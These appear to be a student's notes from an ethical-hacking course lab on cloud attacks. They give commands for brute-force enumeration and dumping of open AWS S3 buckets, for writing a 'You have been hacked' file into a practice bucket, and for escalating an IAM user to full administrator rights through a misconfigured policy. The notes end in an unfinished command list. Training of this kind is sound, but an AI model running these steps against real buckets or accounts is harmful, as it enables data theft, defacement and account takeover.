Module 19: Cloud Computing





1. Perform S3 bucket enumeration using various S3 bucket enumeration tools

a. Enumerate S3 buckets using lazys3

PS: lazys3 is a Ruby script tool that is used to brute-force AWS S3 buckets using different permutations. 

PS: This tool obtains the publicly accessible S3 buckets and also allows you to search the S3 buckets of a specific company by entering the company name.

$ sudo su
$ cd lazys3-master/
$ ls
$ ruby lazys3.rb      (display list of public S3 Buckets)
Cctrl + Z    (Stop)
$ ruby lazys3.rb HackerOne    (HackerOne is Company Name) 





b. Enumerate S3 buckets using S3Scanner

PS: S3Scanner is a tool that finds the open S3 buckets and dumps their contents. It takes a list of bucket names to check as its input. The S3 buckets that are found are output to a file. The tool also dumps or lists the contents of “open” buckets locally.

$ sudo su
$ cd S3Scanner/
$ pip3 install -r requirements.txt     (install required dependencies)
$ python3 ./s3scanner.py sites.txt    (sites.txt is a text file containing the target website URL that is scanned for open S3 buckets)

$ python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt (Dump all open buckets and log both open and closed buckets in found.txt)
$ python3 ./s3scanner.py names.txt  (Just log open buckets in the default output file [buckets.txt])
$ python3 ./s3scanner.py --list names.txt   (Save the file listings of all open buckets to a file


PS: You can also use other S3 bucket enumeration tools such as S3Inspector (https://github.com), s3-buckets-bruteforcer (https://github.com), Mass3 (https://github.com), Bucket Finder (https://digi.ninja), and s3recon (https://github.com) to perform S3 bucket enumeration for a target website or company.









2. Exploit S3 buckets


Listed below are several techniques that can be adopted to identify AWS S3 Buckets:

- Inspecting HTML: Analyze the source code of HTML web pages in the background to find URLs to the target S3 buckets
- Brute-Forcing URL: Use Burp Suite to perform a brute-force attack on the target bucket’s URL to identify its correct URL
- Finding subdomains: Use tools such as Findsubdomains and Robtex to identify subdomains related to the target bucket
- Reverse IP Search: Use search engines such as Bing to perform reverse IP search to identify the domains of the target S3 buckets
- Advanced Google hacking: Use advanced Google search operators such as “inurl” to search for URLs related to the target S3 buckets



a. Exploit open S3 buckets using AWS CLI

$ sudo su
$ cd
$ pip3 install awscli
$ aws --help   (check whether AWS CLI is properly installed)
$ aws s3 ls s3://certifiedhacker1      (list the directories in the certifiedhacker1 bucket)

Confirm in url:   certifiedhacker1.s3.amazonaws.com  in address bar

$ echo “You have been hacked” >> Hack.txt  (create a file named Hack.txt)
$ aws s3 mv Hack.txt s3://certifiedhacker1    (move Hack.txt to the bucket)
$ aws s3 rm s3://certifiedhacker1/Hack.txt    (delete the file from the bucket)






3. Perform privilege escalation to gain higher privileges


a. Escalate IAM user privileges by exploiting misconfigured user policy

$ aws configure
etc
$ vim user-policy.json    (create a file named user-policy)
type I

{

"Version":"2012-10-17",

"Statement": [
{

    "Effect":"Allow",

    "Action":"*",

    "Resource":"*"

}
]
}

PS:  This is an AdministratorAccess policy that gives administrator access to the target IAM user.
Esc. :wq! Enter (save document)

$ aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json    (The created user policy is displayed, showing various details such as PolicyName, PolicyId, and Arn.)

$ aws iam attach-user-policy --user-name test --policy-arn arn;aws:iam::[account ID]:policy/user-policy  (attach the above policy to target IAM user 'test') 

$ aws iam list-attached-user-policies --user-name test   (view the attached policies of user 'test')
$ aws iam list-users  (List all IAM Users in the account)




$ aws s3api list-buckets --query "Buckets.Name"   (List S3 buckets)
$ aws iam list-user-policies   (list user policies)
$ aws iam list-role-policies   (
$ aws iam list-group-policies
$ aws iam create-user



























































































